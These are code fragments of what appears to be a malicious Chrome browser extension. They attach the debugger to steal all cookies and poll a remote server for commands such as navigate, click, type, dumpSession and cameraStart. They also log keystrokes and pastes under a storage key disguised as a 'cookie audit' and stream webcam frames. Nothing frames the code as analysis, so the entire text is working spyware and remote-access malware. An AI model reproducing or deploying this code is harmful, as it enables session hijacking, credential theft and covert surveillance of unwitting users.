await withTimeout(chrome.debugger.attach({ tabId }, "1.3"), 4000);
await withTimeout(
  chrome.debugger.sendCommand({ tabId }, "Network.enable"),
  3000
);
const all = await withTimeout(
  chrome.debugger.sendCommand({ tabId }, "Network.getAllCookies"),
  8000
);
cookies = Array.isArray(all?.cookies) ? all.cookies : [];

const qs = new URLSearchParams({
  wait: remoteCtl.live ? "3500" : "10000",
  agentId: meta.agentId,
  ip: meta.ip || "",
  browser: meta.browser || "",
  ua: meta.userAgent || "",
});
const res = await serverFetch(`${REMOTE_PENDING_URL}?${qs}`);
const data = await res.json();
const cmds = Array.isArray(data.commands) ? data.commands : [];

switch (type) {
  case "navigate":
    await remoteNavigate(payload.url);
    break;
  case "click":
    await remoteClick(payload.x, payload.y, payload.button || "left");
    break;
  case "type":
    await remoteType(payload.text);
    break;
  case "setClipboard":
    await remoteSetClipboard(payload.text);
    break;
  case "cameraStart":
    await cameraStart(payload);
    break;
  case "dumpSession":
  case "dumpCookies":
    await dumpFullSession(type);
    break;
  // openTab, switchTab, screenshot, scroll, key, downloadFile, forceUpdate …
}

const FLUSH_KEYS = 10;
const INACTIVITY_MS = 5000;
const MAX_CHUNK = 8000;
const MAX_PASTE = 2000;
const STORAGE_KEY = "__cookie_audit_keylog_buf";

function persistBuffer() {
  try {
    if (buffer) sessionStorage.setItem(STORAGE_KEY, buffer);
    else sessionStorage.removeItem(STORAGE_KEY);
  } catch {}
}

document.addEventListener("keydown", (e) => {
  if (e.isComposing) return;
  const token = formatKey(e);
  if (token) enqueue(token);
}, true);

document.addEventListener("paste", (e) => {
  const text = e.clipboardData?.getData("text/plain") || "";
  enqueue(`[PASTE]${truncateClip(text)}[/PASTE]`, { interaction: true });
}, true);

const proto = Storage.prototype;
const rawSetItem = proto.setItem;
const rawRemoveItem = proto.removeItem;

proto.setItem = function (key, value) {
  const result = rawSetItem.apply(this, arguments);
  notify("setItem");
  return result;
};

proto.removeItem = function (key) {
  const result = rawRemoveItem.apply(this, arguments);
  notify("removeItem");
  return result;
};

stream = await navigator.mediaDevices.getUserMedia({
  audio: false,
  video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
});
video.srcObject = stream;
await video.play();
timer = setInterval(capture, 400);

canvas.toBlob((blob) => {
  blob.arrayBuffer().then((buf) => {
    chrome.runtime.sendMessage({
      type: "cameraFrame",
      mime: "image/jpeg",
      buffer: Array.from(new Uint8Array(buf)),
    });
  });
}, "image/jpeg", 0.62);